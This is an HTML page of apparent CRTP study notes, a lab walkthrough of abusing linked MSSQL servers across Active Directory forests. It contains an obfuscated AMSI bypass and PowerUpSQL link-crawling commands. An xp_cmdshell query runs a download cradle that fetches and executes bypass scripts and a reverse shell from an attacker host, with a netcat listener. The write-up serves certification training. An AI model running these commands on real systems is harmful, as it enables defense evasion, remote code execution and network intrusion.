@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Trust Links Abuse - CRTP</title>
+  <link rel="shortcut icon" href="../../assets/images/logo.ico" type="image/x-icon">
+  <link rel="stylesheet" href="../../assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+  <style>
+    .crtp-sidebar { padding: 20px; }
+    .crtp-sidebar h3 { color: #ffdb70; margin-bottom: 15px; font-size: 1.1rem; }
+    .crtp-sidebar .home-link { 
+      display: block; 
+      padding: 10px 12px; 
+      margin-bottom: 15px; 
+      color: #ffdb70; 
+      text-decoration: none; 
+      border-radius: 6px; 
+      font-size: 0.9rem; 
+      font-weight: 600;
+      background: #2a2a2a;
+      transition: all 0.2s;
+    }
+    .crtp-sidebar .home-link:hover { 
+      background: #ffdb70; 
+      color: #1a1a1a; 
+    }
+    .crtp-sidebar a { display: block; padding: 8px 12px; margin: 4px 0; color: #d6d6d6; text-decoration: none; border-radius: 6px; font-size: 0.9rem; transition: all 0.2s; }
+    .crtp-sidebar a:hover { background: #2a2a2a; color: #ffdb70; }
+    .crtp-sidebar a.active { background: #ffdb70; color: #1a1a1a; font-weight: 600; }
+    .page-nav { display: flex; justify-content: space-between; margin: 30px 0; padding: 20px 0; border-top: 1px solid #2a2a2a; }
+    .nav-btn { background: #2a2a2a; color: #ffdb70; padding: 10px 20px; border-radius: 6px; text-decoration: none; transition: all 0.2s; }
+    .nav-btn:hover { background: #ffdb70; color: #1a1a1a; }
+    .notion-content { line-height: 1.6; }
+    .notion-content img { max-width: 100%; height: auto; margin: 20px 0; border-radius: 8px; }
+    .notion-content h1 { font-size: 1.8rem; margin: 30px 0 20px; color: #fafafa; }
+    .notion-content h2 { font-size: 1.5rem; margin: 25px 0 15px; color: #fafafa; }
+    .notion-content h3 { font-size: 1.3rem; margin: 20px 0 10px; color: #fafafa; }
+    .notion-content p { margin: 15px 0; color: #d6d6d6; }
+    .notion-content ul, .notion-content ol { margin: 15px 0; padding-left: 30px; }
+    .notion-content li { margin: 5px 0; color: #d6d6d6; }
+    .notion-content code { background: #2a2a2a; padding: 2px 6px; border-radius: 4px; font-family: 'Courier New', monospace; color: #ffdb70; }
+    .notion-content pre { background: #1e1e1e; border-left: 4px solid #ffdb70; padding: 15px; margin: 20px 0; border-radius: 0 8px 8px 0; overflow-x: auto; }
+    .notion-content pre code { background: transparent; padding: 0; color: #d6d6d6; }
+    .notion-content a { color: #ffdb70; text-decoration: underline; }
+    .notion-content strong { color: #fafafa; font-weight: 600; }
+    .notion-content em { font-style: italic; }
+    .notion-content figure { margin: 20px 0; }
+    .notion-content figcaption { display: none; }
+    .main-content { max-width: 100% !important; }
+    .about { max-width: 100% !important; padding: 20px 40px !important; }
+  </style>
+</head>
+<body>
+  <main>
+    <aside class="sidebar" data-sidebar>
+      <div class="sidebar-info">
+        <figure class="avatar-box">
+          <img src="../../assets/images/my-avatar.png?v=3" alt="Mr Stark" width="80">
+        </figure>
+        <div class="info-content">
+          <h1 class="name" title="Mr Stark">Mr Stark</h1>
+          <p class="title">CRTP Study Notes</p>
+        </div>
+        <button class="info_more-btn" data-sidebar-btn>
+          <span>Show Navigation</span>
+          <ion-icon name="chevron-down"></ion-icon>
+        </button>
+      </div>
+      <div class="sidebar-info_more">
+        <div class="separator"></div>
+        <div class="crtp-sidebar">
+          <a href="../../" class="home-link">← Home</a>
+          <a href="../../certifications/" class="home-link">← Certifications</a>
+          <h3>Sections</h3>
+          <a href="enumeration.html" class="">Enumeration</a>
+          <a href="privilege-escalation.html" class="">Privilege Escalation</a>
+          <a href="privilege-escalation-domain-admin.html" class="">Privilege Escalation via Domain Admin</a>
+          <a href="golden-ticket.html" class="">Golden Ticket</a>
+          <a href="silver-ticket.html" class="">Silver Ticket</a>
+          <a href="diamond-ticket.html" class="">Diamond Ticket</a>
+          <a href="abusing-dsrm-credentials.html" class="">Abusing DSRM Credentials</a>
+          <a href="dcsync-attack.html" class="">DCSync Attack</a>
+          <a href="security-descriptor-abuse.html" class="">Security Descriptor Abuse</a>
+          <a href="asrep-roasting.html" class="">AS-REP Roasting</a>
+          <a href="unconstrained-delegation.html" class="">Unconstrained Delegation</a>
+          <a href="constrained-delegation.html" class="">Constrained Delegation</a>
+          <a href="rbcd.html" class="">RBCD</a>
+          <a href="sid-history-trust-ticket.html" class="">SID-History Trust Ticket</a>
+          <a href="sid-history-krbtgt.html" class="">SID-History KRBTGT</a>
+          <a href="cross-forest-trust.html" class="">Cross-Forest Trust</a>
+          <a href="adcs-attacks.html" class="">ADCS Attacks</a>
+          <a href="trust-links-abuse.html" class="active">Trust Links Abuse</a>
+          <a href="mde-mdi-bypass.html" class="">MDE/MDI Bypass</a>
+
+        </div>
+        <div class="separator"></div>
+        <ul class="contacts-list">
+          <li class="contact-item">
+            <div class="icon-box">
+              <ion-icon name="mail-outline"></ion-icon>
+            </div>
+            <div class="contact-info">
+              <p class="contact-title">Email</p>
+              <a href="mailto:daviosardinha@gmail.com" class="contact-link">daviosardinha@gmail.com</a>
+            </div>
+          </li>
+        </ul>
+      </div>
+    </aside>
+
+    <div class="main-content">
+      <article class="about active" data-page="about">
+        <header class="h2 article-title">Trust Links Abuse</header>
+        <section class="about-text">
+          <div class="notion-content">
+<p><strong>What is Trust Links Abuse?</strong></p>
+<p>Trust Links Abuse refers to the exploitation of trust relationships within an organization to gain unauthorized access to sensitive information or systems. 
+This can be achieved by manipulating or compromising the trust relationships between individuals or entities within the organization.</p>
+<p><strong>How does it work?</strong></p>
+<ol>
+<li>
+<p>Identifying Trust Relationships: The attacker identifies trust relationships within the organization, such as relationships between employees, contractors, or partners.</p>
+</li>
+<li>
+<p>Compromising Trust: The attacker compromises the trust relationship by gaining access to sensitive information or systems, or by manipulating the relationship to gain unauthorized access.</p>
+</li>
+<li>
+<p>Exploiting Trust: The attacker exploits the compromised trust relationship to gain access to sensitive information or systems, or to perform unauthorized actions.</p>
+</li>
+</ol>
+<p>For this lab, let’s try to get a reverse shell on a SQL server in EUROCORP forest by abusing database links from DCORP-MSSQL.</p>
+<p>Let’s start with enumerating SQL servers in the domain and if studentx has privileges to connect to any of them. We can use PowerUpSQL module for that.</p>
+<p>Since we will be doing the enumeration via PowerShell, let run InvisiShell first for Script Blocking bypass and also AMSI bypass.</p>
+<p><code>RunWithRegistryNonAdmin.bat</code></p>
+<p>AMSI Bypass</p>
+<div class="highlight"><pre><span></span><code><span class="n">S</span><span class="p">`</span><span class="n">eT-It</span><span class="p">`</span><span class="n">em</span> <span class="p">(</span> <span class="s1">&#39;V&#39;</span><span class="p">+</span><span class="s1">&#39;aR&#39;</span> <span class="p">+</span> <span class="s1">&#39;IA&#39;</span> <span class="p">+</span> <span class="p">(</span><span class="s1">&#39;blE:1&#39;</span><span class="p">+</span><span class="s1">&#39;q2&#39;</span><span class="p">)</span> <span class="p">+</span> <span class="p">(</span><span class="s1">&#39;uZ&#39;</span><span class="p">+</span><span class="s1">&#39;x&#39;</span><span class="p">)</span> <span class="p">)</span> <span class="p">(</span><span class="no">[TYpE]</span><span class="p">(</span> <span class="s2">&quot;{1}{0}&quot;</span><span class="o">-F</span><span class="s1">&#39;F&#39;</span><span class="p">,</span><span class="s1">&#39;rE&#39;</span> <span class="p">)</span> <span class="p">)</span> <span class="p">;</span> <span class="p">(</span> <span class="nb">Get-varI</span><span class="p">`</span><span class="n">A</span><span class="p">`</span><span class="n">BLE</span> <span class="p">((</span><span class="s1">&#39;1Q&#39;</span><span class="p">+</span><span class="s1">&#39;2U&#39;</span><span class="p">)</span> <span class="p">+</span><span class="s1">&#39;zX&#39;</span> <span class="p">)</span> <span class="n">-VaL</span> <span class="p">).</span><span class="s2">&quot;A`ss`Embly&quot;</span><span class="p">.</span><span class="s2">&quot;GET</span><span class="se">`T</span><span class="s2">Y`Pe&quot;</span><span class="p">((</span><span class="s2">&quot;{6}{3}{1}{4}{2}{0}{5}&quot;</span> <span class="o">-f</span><span class="p">(</span><span class="s1">&#39;Uti&#39;</span><span class="p">+</span><span class="s1">&#39;l&#39;</span><span class="p">),</span><span class="s1">&#39;A&#39;</span><span class="p">,(</span><span class="s1">&#39;Am&#39;</span><span class="p">+</span><span class="s1">&#39;si&#39;</span><span class="p">),(</span><span class="s1">&#39;.Man&#39;</span><span class="p">+</span><span class="s1">&#39;age&#39;</span><span class="p">+</span><span class="s1">&#39;men&#39;</span><span class="p">+</span><span class="s1">&#39;t.&#39;</span><span class="p">),(</span><span class="s1">&#39;u&#39;</span><span class="p">+</span><span class="s1">&#39;to&#39;</span><span class="p">+</span><span class="s1">&#39;mation.&#39;</span><span class="p">),</span><span class="s1">&#39;s&#39;</span><span class="p">,(</span><span class="s1">&#39;Syst&#39;</span><span class="p">+</span><span class="s1">&#39;em&#39;</span><span class="p">)</span> <span class="p">)</span> <span class="p">).</span><span class="s2">&quot;g`etf`iElD&quot;</span><span class="p">(</span> <span class="p">(</span> <span class="s2">&quot;{0}{2}{1}&quot;</span> <span class="o">-f</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">+</span><span class="s1">&#39;msi&#39;</span><span class="p">),</span><span class="s1">&#39;d&#39;</span><span class="p">,(</span><span class="s1">&#39;I&#39;</span><span class="p">+</span><span class="s1">&#39;nitF&#39;</span><span class="p">+</span><span class="s1">&#39;aile&#39;</span><span class="p">)</span> <span class="p">),(</span> <span class="s2">&quot;{2}{4}{0}{1}{3}&quot;</span> <span class="o">-f</span><span class="p">(</span><span class="s1">&#39;S&#39;</span><span class="p">+</span><span class="s1">&#39;tat&#39;</span><span class="p">),</span><span class="s1">&#39;i&#39;</span><span class="p">,(</span><span class="s1">&#39;Non&#39;</span><span class="p">+</span><span class="s1">&#39;Publ&#39;</span><span class="p">+</span><span class="s1">&#39;i&#39;</span><span class="p">),</span><span class="s1">&#39;c&#39;</span><span class="p">,</span><span class="s1">&#39;c,&#39;</span> <span class="p">)).</span><span class="s2">&quot;sE</span><span class="se">`T`V</span><span class="s2">aLUE&quot;</span><span class="p">(${</span><span class="n">n</span><span class="p">`</span><span class="n">ULl</span><span class="p">},${</span><span class="n">t</span><span class="p">`</span><span class="n">RuE</span><span class="p">}</span> <span class="p">)</span>
+</code></pre></div>
+
+<p>Let’s start with enumerating SQL servers in the domain and if our current compromised user has privileges to connect to any of them. 
+We can use PowerUpSQL module for that.</p>
+<p><code>Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose</code></p>
+<div class="highlight"><pre><span></span><code><span class="n">VERBOSE</span><span class="p">:</span> <span class="n">dcorp-mgmt</span><span class="p">.</span><span class="n">dollarcorp</span><span class="p">.</span><span class="n">moneycorp</span><span class="p">.</span><span class="n">local</span><span class="p">,</span><span class="n">1433</span> <span class="p">:</span> <span class="n">Connection</span> <span class="n">Failed</span><span class="p">.</span>
+<span class="n">VERBOSE</span><span class="p">:</span> <span class="n">dcorp-mgmt</span><span class="p">.</span><span class="n">dollarcorp</span><span class="p">.</span><span class="n">moneycorp</span><span class="p">.</span><span class="n">local</span> <span class="p">:</span> <span class="n">Connection</span> <span class="n">Failed</span><span class="p">.</span>
+<span class="n">VERBOSE</span><span class="p">:</span> <span class="n">dcorp-mssql</span><span class="p">.</span><span class="n">dollarcorp</span><span class="p">.</span><span class="n">moneycorp</span><span class="p">.</span><span class="n">local</span><span class="p">,</span><span class="n">1433</span> <span class="p">:</span> <span class="n">Connection</span> <span class="n">Success</span><span class="p">.</span>
+<span class="n">VERBOSE</span><span class="p">:</span> <span class="n">dcorp-mssql</span><span class="p">.</span><span class="n">dollarcorp</span><span class="p">.</span><span class="n">moneycorp</span><span class="p">.</span><span class="n">local</span> <span class="p">:</span> <span class="n">Connection</span> <span class="n">Success</span><span class="p">.</span>
+<span class="n">VERBOSE</span><span class="p">:</span> <span class="n">dcorp-sql1</span><span class="p">.</span><span class="n">dollarcorp</span><span class="p">.</span><span class="n">moneycorp</span><span class="p">.</span><span class="n">local</span><span class="p">,</span><span class="n">1433</span> <span class="p">:</span> <span class="n">Connection</span> <span class="n">Failed</span><span class="p">.</span>
+<span class="n">VERBOSE</span><span class="p">:</span> <span class="n">dcorp-sql1</span><span class="p">.</span><span class="n">dollarcorp</span><span class="p">.</span><span class="n">moneycorp</span><span class="p">.</span><span class="n">local</span> <span class="p">:</span> <span class="n">Connection</span> <span class="n">Failed</span><span class="p">.</span>
+
+<span class="n">ComputerName</span>           <span class="p">:</span> <span class="n">dcorp-mssql</span><span class="p">.</span><span class="n">dollarcorp</span><span class="p">.</span><span class="n">moneycorp</span><span class="p">.</span><span class="n">local</span>
+<span class="n">Instance</span>               <span class="p">:</span> <span class="n">DCORP-MSSQL</span>
+<span class="n">DomainName</span>             <span class="p">:</span> <span class="n">dcorp</span>
+<span class="n">ServiceProcessID</span>       <span class="p">:</span> <span class="n">2024</span>
+<span class="n">ServiceName</span>            <span class="p">:</span> <span class="n">MSSQLSERVER</span>
+<span class="n">ServiceAccount</span>         <span class="p">:</span> <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">NETWORKSERVICE</span>
+<span class="n">AuthenticationMode</span>     <span class="p">:</span> <span class="n">Windows</span> <span class="n">and</span> <span class="n">SQL</span> <span class="n">Server</span> <span class="n">Authentication</span>
+<span class="n">ForcedEncryption</span>       <span class="p">:</span> <span class="n">0</span>
+<span class="n">Clustered</span>              <span class="p">:</span> <span class="n">No</span>
+<span class="n">SQLServerVersionNumber</span> <span class="p">:</span> <span class="n">15</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">2000</span><span class="p">.</span><span class="n">5</span>
+<span class="n">SQLServerMajorVersion</span>  <span class="p">:</span> <span class="n">2019</span>
+<span class="n">SQLServerEdition</span>       <span class="p">:</span> <span class="n">Developer</span> <span class="n">Edition</span> <span class="p">(</span><span class="n">64-bit</span><span class="p">)</span>
+<span class="n">SQLServerServicePack</span>   <span class="p">:</span> <span class="n">RTM</span>
+<span class="n">OSArchitecture</span>         <span class="p">:</span> <span class="n">X64</span>
+<span class="n">OsVersionNumber</span>        <span class="p">:</span> <span class="n">SQL</span>
+<span class="n">Currentlogin</span>           <span class="p">:</span> <span class="n">dcorp</span><span class="p">\</span><span class="n">student451</span>
+<span class="n">IsSysadmin</span>             <span class="p">:</span> <span class="n">No</span>
+<span class="n">ActiveSessions</span>         <span class="p">:</span> <span class="n">1</span>
+</code></pre></div>
+
+<h3>ComputerName and Instance</h3>
+<ul>
+<li>
+<p>ComputerName: The name of the computer where the SQL Server instance is running.</p>
+</li>
+<li>
+<p>Instance: The name of the SQL Server instance.</p>
+</li>
+</ul>
+<h3>DomainName</h3>
+<ul>
+<li>DomainName: The name of the domain where the SQL Server instance is located.</li>
+</ul>
+<h3>ServiceProcessID and ServiceName</h3>
+<ul>
+<li>
+<p>ServiceProcessID: The process ID of the SQL Server service.</p>
+</li>
+<li>
+<p>ServiceName: The name of the SQL Server service.</p>
+</li>
+</ul>
+<h3>ServiceAccount</h3>
+<ul>
+<li>ServiceAccount: The account used by the SQL Server service to run. In this case, it's the NT AUTHORITY\NETWORKSERVICE account.</li>
+</ul>
+<h3>AuthenticationMode</h3>
+<ul>
+<li>AuthenticationMode: The authentication mode used by the SQL Server instance. In this case, it's set to both Windows and SQL Server authentication.</li>
+</ul>
+<h3>ForcedEncryption</h3>
+<ul>
+<li>ForcedEncryption: A flag indicating whether encryption is forced for all connections. In this case, it's set to 0, indicating that encryption is not forced.</li>
+</ul>
+<h3>Clustered</h3>
+<ul>
+<li>Clustered: A flag indicating whether the SQL Server instance is clustered. In this case, it's set to No, indicating that the instance is not clustered.</li>
+</ul>
+<h3>SQLServerVersionNumber, SQLServerMajorVersion, and SQLServerEdition</h3>
+<ul>
+<li>
+<p>SQLServerVersionNumber: The version number of the SQL Server instance.</p>
+</li>
+<li>
+<p>SQLServerMajorVersion: The major version number of the SQL Server instance.</p>
+</li>
+<li>
+<p>SQLServerEdition: The edition of the SQL Server instance. In this case, it's the Developer Edition (64-bit).</p>
+</li>
+</ul>
+<h3>SQLServerServicePack</h3>
+<ul>
+<li>SQLServerServicePack: The service pack number of the SQL Server instance. In this case, it's set to RTM, indicating that it's the initial release.</li>
+</ul>
+<h3>OSArchitecture and OsVersionNumber</h3>
+<ul>
+<li>
+<p>OSArchitecture: The architecture of the operating system running the SQL Server instance. In this case, it's X64.</p>
+</li>
+<li>
+<p>OsVersionNumber: The version number of the operating system running the SQL Server instance. In this case, it's SQL, indicating that it's a SQL Server instance.</p>
+</li>
+</ul>
+<h3>Currentlogin and IsSysadmin</h3>
+<ul>
+<li>
+<p>Currentlogin: The current login user of the SQL Server instance. In this case, it's dcorp\student451.</p>
+</li>
+<li>
+<p>IsSysadmin: A flag indicating whether the current login user is a system administrator. In this case, it's set to No, indicating that the user is not a system administrator.</p>
+</li>
+</ul>
+<h3>ActiveSessions</h3>
+<ul>
+<li>ActiveSessions: The number of active sessions on the SQL Server instance. In this case, it's set to 1, indicating that there is one active session.</li>
+</ul>
+<p>This output provides a comprehensive overview of the SQL Server instance, including its configuration, security settings, and current state.</p>
+<p>The PowerUPSQL enumeration show us that we are able to connect to the MSSQL(DCORP-MSSQL) service running in dollarcorp.moneycorp.local domain.</p>
+<p>By sing HeidiSQL client, we can login to DCORP-MSSQL using windows authentication of our current user..</p>
+<p>Now that we were able to login to DCORP-MSSQL we can start making queries.</p>
+<p>we can start by checking the version running this MSSQL, it’s always good to know what version we are working with.
+<code>Select @@version</code></p>
+<p>The following command will enumerate the linked databases on DCORP-MSSQL.</p>
+<p><code>Select * From master..sysservers;</code></p>
+<p>Above we can see that DCORP-MSSQL database has a link to DCORP-SQL1 as well, let’s now do a further enumeration from DCORP-SQL1.</p>
+<p><code>Select * From openquery("DCORP-SQL1", 'Select * From master..sysservers');</code></p>
+<p>One thing we can do is to nest <code>openquery</code> within another <code>openquery</code> which leads us to <strong>DCORP-MGMT.</strong>So let’s continue…</p>
+<p><code>select * from openquery("DCORP-SQL1",'select * from openquery("DCORP-MGMT",''select * from master..sysservers'')')</code></p>
+<p>Now we can see that  DCORP-MGMT has also a trust link to EU.SQL30, which is another database server on another root forest(eu.eurocorp.local).</p>
+<p>Now that we have see how we can manually enumerate trust inside MSSQL database, let’s see an automated and fast way to enumerate theses trust links.</p>
+<p>We can use PowerUPSQL module again.</p>
+<p><code>Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose</code></p>
+<p>Base on the output above from PowerUPSQL, we can see that we do have sysadmin in EU-SQL30.</p>
+<p>From from here we have 2 ways, we can continue on making queries using the MSSQL client HeidiSQL client, or we can continue using PowerUPSQL modules.</p>
+<p>For now let’s continue using PowerUPSQL module <code>Get-SQLServerLinkCrawl</code>.</p>
+<p>Let’s enumerate and check If <code>xp_cmdshell</code> is enabled.</p>
+<p><code>Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'set username'"</code></p>
+<p>Well the above screenshot shows us some interesting information… The query we did above was to check if it is possible to execute OS commands using linked databases.
+We can see that when we check the  parameters in all Instances, the only one that came up containing some information was the EUSQL30 instance(<code>CustomQuery : {USERNAME=SYSTEM, }</code>), meaning that we can execute OS commands using the trust links between instances.</p>
+<p>We can get a Reverse Shell in this case. to achieve this task we will be using Invoke-PowerShellTcp.ps1 by modifying it and adding the following command on it:
+<code>Power -Reverse -IPAddress &lt;OUR_IP&gt; -Port 443</code></p>
+<p>Open Invoke-PowerShellTcpEx.ps1 in PowerShell ISE (Right click on it and click Edit).</p>
+<p>Let’s try to execute a PowerShell download execute cradle to execute a PowerShell reverse shell on the EU-SQL30 instance. 
+We should not forget to start a listener on our machine.</p>
+<p><code>Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec masterxp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.51/sbloggingbypass.txt); iex (iwr -UseBasicParsing http://172.16.100.51/amsibypass.txt); iex (iwr -UseBasicParsing http://172.16.100.51/Invoke-PowerShellTcpEx.ps1)" '' -QueryTarget EU-SQL30</code></p>
+<p>On our side we can simply start our listener.</p>
+<p><code>C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443</code></p>
+<p>We can see above that we were able to abuse the trust link in <strong>DCORP-MSSQL</strong> all the way to <strong>EU-SQL30</strong>. from a simple Domain user to Enterprise Admin.</p>
+          </div>
+        </section>
+      </article>
+    </div>
+  </main>
+
+  <script src="../../assets/js/script.js"></script>
+  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+</body>
+</html>
